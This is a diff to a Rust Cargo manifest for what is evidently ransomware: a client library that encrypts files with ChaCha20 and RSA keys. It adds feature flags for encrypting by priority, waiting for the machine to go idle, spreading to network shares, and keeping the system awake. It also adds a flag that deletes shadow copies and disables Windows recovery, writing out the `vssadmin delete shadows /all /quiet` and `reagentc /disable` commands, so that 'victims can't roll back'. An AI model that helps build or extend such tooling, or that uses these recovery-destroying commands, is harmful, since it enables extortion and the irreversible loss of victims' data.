@@ -5,31 +5,93 @@ edition = "2021"
 
 # See more keys and their definitions at https://doc.rust-lang.org/cargo/reference/manifest.html
 
+[lib]
+name = "client_lib"
+path = "src/lib.rs"
+
+[features]
+# Scan & encrypt-by-priority pipeline (SCAN_PRIORITY_PLAN.md). Disabled by
+# default: a default build compiles none of this code, and `encrypt_everything`
+# keeps its original behavior byte-for-byte.
+priority-scan = []
+# Gate the encryption run on system idle time (see src/idle.rs): only start
+# once the machine has been idle past `IDLE_THRESHOLD_SECS`, and (when
+# `PAUSE_WHEN_NOT_AFK` is true) pause while the user is active mid-run.
+# Disabled by default: encryption runs as before.
+idle-gating = []
+# Enumerate and walk SMB/network mounts (see src/net_share.rs): Windows mapped
+# drives + UNC shares (`\\server\share`), Linux NFS/CIFS mounts from
+# /proc/mounts. Disabled by default: a default build only walks local disks,
+# exactly as before.
+net-shares = []
+# Delete Windows Volume Shadow Copies (`vssadmin delete shadows /all /quiet`)
+# at the start of the run so victims can't roll back via restore points, and
+# disable Windows Recovery Environment (`reagentc /disable`) so a factory
+# restore can't be used either (see src/shadow.rs). Disabled by default:
+# restore points are left untouched.
+vss-delete = []
+# Pressure tactics (see src/awake.rs): keep the system awake for the whole run
+# so a partially-encrypted machine can't drop to sleep and stall the job.
+# Disabled by default: power state is left alone.
+pressure = []
+
 [dependencies]
 chacha20poly1305 = { version = "0.10.1", features = ["stream"] }
-anyhow = "1.0.70"
-rand = "0.8.5"
-sysinfo = "0.28.4"
-walkdir = "2.3.3"
-rayon = "1.7.0"
-serde = { version = "1.0.160", features = ["derive"] }
-serde_json = { version = "1.0.96", features = ["default"] }
-rsa = "0.9.0"
-zeroize = { version = "1.6.0", features = ["derive"] }
-directories = "5.0.0"
-lazy_static = "1.4.0"
-obfstr = "0.4.3"
-konst = "0.3.4"
-sha2 = "0.10.6"
+anyhow = "1.0.104"
+rand = "0.8.7"
+sysinfo = "0.39.6"
+walkdir = "2.5.0"
+rayon = "1.12.0"
+serde = { version = "1.0.229", features = ["derive"] }
+serde_json = { version = "1.0.151", features = ["default"] }
+rsa = "0.9.10"
+zeroize = { version = "1.9.0", features = ["derive"] }
+directories = "6.0.0"
+lazy_static = "1.5.0"
+obfstr = "0.4.6"
+konst = "0.4.3"
+sha2 = "0.10.9"
 
 [dependencies.uuid]
-version = "1.3.1"
+version = "1.24.0"
 features = [
     "v4",                # Lets you generate random UUIDs
     "fast-rng",          # Use a faster (but still sufficiently random) RNG
 ]
 
-#[target.'cfg(target_os = "windows")'.dependencies]
-#
-#[target.'cfg(target_os = "linux,mac")'.dependencies]
-#sys_metrics = "0.2.6"
+# Only used by the `idle-gating` feature's Windows idle detection, the
+# `net-shares` feature's WNet network-share enumeration, and the `pressure`
+# feature's sleep/hibernate prevention.
+[target.'cfg(windows)'.dependencies]
+windows-sys = { version = "0.61", features = [
+    "Win32_UI_Input_KeyboardAndMouse",
+    "Win32_System_SystemInformation",
+    "Win32_NetworkManagement_WNet",
+    "Win32_System_Power",
+    "Win32_Foundation",
+] }
+
+[dev-dependencies]
+criterion = { version = "0.8", features = ["html_reports"] }
+tempfile = "3.27.0"
+jwalk = "0.9"
+memmap2 = "0.9.11"
+rand = "0.8.7"
+tokio = { version = "1", features = ["rt-multi-thread", "macros", "fs", "io-util", "sync"] }
+
+[[bench]]
+name = "encrypt_bench"
+harness = false
+
+[[bench]]
+name = "walker_bench"
+harness = false
+
+[[bench]]
+name = "async_bench"
+harness = false
+
+# Priority-scan integration tests only compile when the feature is enabled.
+[[test]]
+name = "priority_scan"
+required-features = ["priority-scan"]
